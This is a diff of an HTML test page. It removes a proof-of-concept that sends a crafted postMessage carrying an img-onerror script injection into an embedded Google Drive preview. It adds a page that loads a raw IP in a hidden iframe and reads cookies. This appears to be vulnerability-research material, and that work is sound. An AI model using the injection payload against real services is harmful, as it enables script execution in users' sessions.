@@ -1,56 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Google Drive postMessage Exploit PoC</title>
-  <style>
-    body { font-family: sans-serif; }
-    #status { margin-top: 20px; font-size: 1.2em; color: red; }
-  </style>
+  <title>Google IP Cookie Injection Test</title>
 </head>
 <body>
-  <h2>Google Drive postMessage Exploit PoC</h2>
-  <p>
-    If vulnerable, Drive will execute injected JavaScript. <br>
-    A red message will appear below if the payload succeeds.
-  </p>
+  <h2>Google IP Cookie Injection Test</h2>
+  <p>If vulnerable, cookies for <code>.google.com</code> might show up below after loading the raw IP.</p>
 
-  <!-- Victim iframe (replace FILE_ID with your test video) -->
-  <iframe id="victim" 
-          src="https://drive.google.com/file/d/1-8sZYG1WZVbEN2txGkJseHvS88P4nRri/preview" 
-          width="800" height="600">
-  </iframe>
+  <button onclick="test()">Run Test</button>
 
-  <div id="status">[Waiting for test result...]</div>
+  <pre id="output"></pre>
 
   <script>
-    // This function will be called if exploit succeeds
-    function exploitSuccess() {
-      document.getElementById("status").textContent = 
-        "✅ Exploit succeeded: JS executed inside drive.google.com";
-      document.getElementById("status").style.color = "green";
+    async function test() {
+      // Step 1: Request the Google IP in an iframe
+      let iframe = document.createElement('iframe');
+      iframe.src = "http://104.168.141.136/";
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+
+      // Step 2: Wait a bit for cookies to be set
+      await new Promise(r => setTimeout(r, 3000));
+
+      // Step 3: Check document.cookie for google.com
+      // ⚠️ Note: JS only sees cookies available to current origin
+      // So this will *likely* be empty. Real test is in DevTools > Application > Cookies
+      document.getElementById("output").innerText =
+        "document.cookie for this page: " + document.cookie +
+        "\n\nNow check DevTools → Application → Storage → Cookies for .google.com";
     }
-
-    // Payload to inject into Drive
-    const payload = {
-      event: "infoDelivery",
-      info: {
-        videoData: {
-          // Inject JS that calls back to exploitSuccess()
-          title: `<img src=x onerror="parent.exploitSuccess()">`
-        }
-      },
-      channel: "widget",
-      id: 1337
-    };
-
-    // Send payload after iframe loads
-    document.getElementById("victim").onload = function() {
-      document.getElementById("victim").contentWindow.postMessage(
-        JSON.stringify(payload),
-        "*" // attacker-controlled origin
-      );
-    };
   </script>
 </body>
 </html>
